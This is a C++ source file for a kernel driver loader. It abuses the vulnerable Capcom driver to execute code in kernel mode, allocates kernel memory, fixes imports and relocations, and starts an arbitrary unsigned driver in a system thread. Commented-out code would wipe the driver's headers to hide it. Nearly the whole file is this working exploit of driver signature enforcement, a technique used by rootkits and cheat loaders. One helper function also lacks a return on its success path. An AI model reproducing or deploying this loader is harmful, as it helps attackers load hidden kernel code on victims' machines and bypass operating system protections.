// SafeMap.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "pch.h"
#include "MapImage.h"
#include <iostream>
#include <fstream>
#include <iterator>
#include <assert.h>

// Maybe convert to lib / DLL?
bool open_binary_file(const std::string& file, std::vector<uint8_t>& data) // Useless in our actual implementation;
{
	std::ifstream file_stream(file, std::ios::binary);
	if (file_stream.is_open()) {
		file_stream.unsetf(std::ios::skipws);
		file_stream.seekg(0, std::ios::end);

		const auto file_size = file_stream.tellg();
		if (file_size == 0)
			return false;

		file_stream.seekg(0, std::ios::beg);
		data.reserve(static_cast<uint32_t>(file_size));
		data.insert(data.begin(), std::istream_iterator<uint8_t>(file_stream), std::istream_iterator<uint8_t>());
		file_stream.close();
	}
	else {
		return false;
	}
}

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

int main(int argc, char** argv)
{
	if (argc < 2) {
		printf("[-] Usage: SafeMap.exe <driver_file>\n");
		return -1;
	}

	// Loader initial checks...
	std::vector<uint8_t> driver_image;
	if (open_binary_file(argv[1], driver_image)) {
		MapImage driver(driver_image);
		// Loader has driver file in memory :)
		if (!Np_LockSections()) // Failed to setup locked sections, fail!
			return 0;

		KernelContext* KrCtx = Kr_InitContext();
		CapcomContext* CpCtx = Cl_InitContext();

		CapcomRoutines *capcom = new CapcomRoutines(KrCtx, CpCtx);

		const auto _get_module = [&capcom](std::string_view name)
		{
			return capcom->get_kernel_module(name);
		};

		const auto _get_export_name = [&capcom](uintptr_t base, const char* name)
		{
			return capcom->get_export(base, name);
		};

		const std::function<uintptr_t(uintptr_t, uint16_t)> _get_export_ordinal = [&capcom](uintptr_t base, uint16_t ord)
		{
			return capcom->get_export(base, ord);
		};

		if (!KrCtx || !CpCtx)
			return -1;

		Khu_Init(CpCtx, KrCtx);

		NON_PAGED_DATA static auto kernel_memory = capcom->allocate_pool(driver.size(), NonPagedPool, true);

		if (kernel_memory == 0)
			return -1;

		printf("[+] allocated 0x%llX bytes at 0x%I64X\n", driver.size(), kernel_memory);

		driver.fix_imports(_get_module, _get_export_name, _get_export_ordinal);

		printf("[+] imports fixed\n");

		driver.map();

		printf("[+] sections mapped in memory\n");

		driver.relocate(kernel_memory);

		printf("[+] relocations fixed\n");

		//NON_PAGED_DATA static auto _RtlCopyMemory = KrCtx->GetProcAddress<>("RtlCopyMemory");
		NON_PAGED_DATA static auto size = driver.size();
		NON_PAGED_DATA static auto source = driver.data();
		NON_PAGED_DATA static auto entry_point = kernel_memory + driver.entry_point();

		CpCtx->ExecuteInKernel(NON_PAGED_LAMBDA()
		{
			Np_memcpy(kernel_memory, source, size);
		});

		printf("[+] calling entry point at 0x%I64X\n", entry_point);

		NON_PAGED_DATA static auto PsCreateSystemThread = KrCtx->GetProcAddress<>("PsCreateSystemThread");
		NON_PAGED_DATA static auto ZwClose = KrCtx->GetProcAddress<>("ZwClose");

		CpCtx->ExecuteInKernel(NON_PAGED_LAMBDA()
		{
			// Do not call _enable()
			// _enable();

			// When you require a kernel api to be called use KrCtx to get it BEFORE you are in kernel context.
			// MmGetSystemRoutineAddress requires IRQL==PASSIVE_LEVEL and is bad engineering on capcom's side.

			// You can use data without NON_PAGED_DATA prefix in Khk_PassiveCall though. (the strings in this case)
			OBJECT_ATTRIBUTES           attr;
			HANDLE                      th;
			InitializeObjectAttributes(&attr, NULL, 0x00000200L, NULL, NULL);
			NTSTATUS status = Khk_CallPassive(PsCreateSystemThread, &th, THREAD_ALL_ACCESS, &attr, NULL, NULL, entry_point, NULL);
			if (status == STATUS_SUCCESS) {
				Khk_CallPassive(ZwClose, th);
			}
			// Make sure you specify the sizes for the integers (5ull instead of 5)
		});

		////if (status == STATUS_SUCCESS)
		////{
		//	printf("[+] successfully created driver object!\n");

		//	NON_PAGED_DATA static auto _RtlZeroMemory = KrCtx->GetProcAddress<>("RtlZeroMemory");
		//	NON_PAGED_DATA static auto header_size = driver.header_size();

		//	CpCtx->ExecuteInKernel(NON_PAGED_LAMBDA()
		//	{
		//		_RtlZeroMemory((void*)kernel_memory, header_size);
		//	});

		//	printf("[+] wiped headers!\n");
		//}
		//else
		//{
		//	printf("[-] Driver failed to start status: 0x%I32X\n", status);

		//}

		// Good old cleanup ;)
		Cl_FreeContext(CpCtx);
		Kr_FreeContext(KrCtx);
	}
	else {
		printf("[-] Failed to open file!\n");
		return -1;
	}

    std::cout << "Hello World!\n"; 
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
